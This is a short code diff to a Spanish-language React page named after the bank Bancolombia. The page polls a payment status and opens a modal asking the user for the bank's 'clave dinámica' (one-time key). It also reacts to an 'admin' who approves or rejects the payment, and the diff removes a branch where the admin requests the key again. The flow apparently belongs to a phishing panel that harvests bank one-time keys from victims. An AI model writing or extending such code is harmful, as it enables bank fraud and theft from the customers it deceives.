@@ -33,14 +33,12 @@ export default function BancolombiaCargandoPage() {
           setStatus(data.status);
 
           if (data.status === 'waiting_otp') {
+            // Mostrar modal para ingresar clave dinámica
             setShowOtpModal(true);
+            setOtp(''); // Limpiar OTP anterior si lo había
           } else if (data.status === 'admin_rejected') {
             // Admin rechazó el pago - Redirigir a carrito con mensaje de error
             router.push('/carrito?error=pago_fallido');
-          } else if (data.status === 'request_otp_again') {
-            // Admin solicitó la dinámica de nuevo
-            setShowOtpModal(true);
-            setOtp('');
           }
         }
       } catch (error) {
